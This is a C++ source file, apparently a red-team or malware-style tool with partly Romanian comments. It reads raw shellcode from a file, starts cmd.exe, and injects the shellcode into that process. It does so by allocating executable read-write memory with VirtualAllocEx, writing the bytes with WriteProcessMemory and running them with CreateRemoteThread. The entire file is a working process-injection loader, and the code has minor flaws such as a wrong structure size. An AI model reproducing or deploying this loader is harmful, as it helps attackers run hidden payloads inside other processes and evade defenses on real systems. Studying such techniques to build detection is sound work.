#include <iostream>
#include <Windows.h>
#include <vector>

BYTE* get_file_bytes(const wchar_t* filePath, DWORD &outputBytesRead) {
    // we will get a handle to the existing file (if the shellcode is in a file)
	HANDLE payload = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (payload == INVALID_HANDLE_VALUE) {
        printf("[!] Could not open payload: %ws\n", filePath);
    }
    else {
        DWORD size = GetFileSize(payload, NULL);
        DWORD bytesRead = 0;
        BYTE* buffer = new BYTE[size + 1];

        // we will read the bytes 
        if (FALSE == ReadFile(payload, buffer, size, &bytesRead, NULL)) {
            printf("[!] Could not read payload!\n");
        }
        else {
            buffer[bytesRead] = '\0';
        }
        outputBytesRead = bytesRead;
        return buffer;
    }
    return NULL;
}

void inject_shellcode(wchar_t cmd[], std::vector<BYTE> shellcode) {
    LPSTARTUPINFOW       si;
    PPROCESS_INFORMATION pi;
    BOOL                 success;

    si = new STARTUPINFOW();
    si->cb = sizeof(LPSTARTUPINFOW);

    pi = new PROCESS_INFORMATION();

    // we will create the process normally
    success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        si,
        pi);

    LPVOID ptr = VirtualAllocEx(
        pi->hProcess, // handle-ul procesului
        NULL,
        shellcode.size(), // marimea shellcode-ului
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE // permisiuni RWX
    );

    SIZE_T bytesWritten = 0;

    if (!WriteProcessMemory(
        pi->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten
    )) {
        std::cout << "[+] Error WriteProcessMemory " << GetLastError() << std::endl;
    }

    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        pi->hProcess, // handle-ul procesului
        NULL,
        0, // marimea stivei; 0 - va folosi toata marimea executabilului
        (LPTHREAD_START_ROUTINE)ptr, // adresa de start
        NULL,
        0, // flagul de executie; 0 - este executat imediat
        &threadId // parametru de output - ID-ul thread-ului
    );

    CloseHandle(hThread);
    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);
}

int main() {
    DWORD bytesRead = 0;
    BYTE* payload = get_file_bytes(L"C:\\Users\\Administrator\\Downloads\\output\0", bytesRead);
    std::vector<BYTE> shellcode(payload, payload+bytesRead);

    wchar_t cmd[] = L"cmd.exe\0";
    inject_shellcode(cmd, shellcode);

    return 0;
}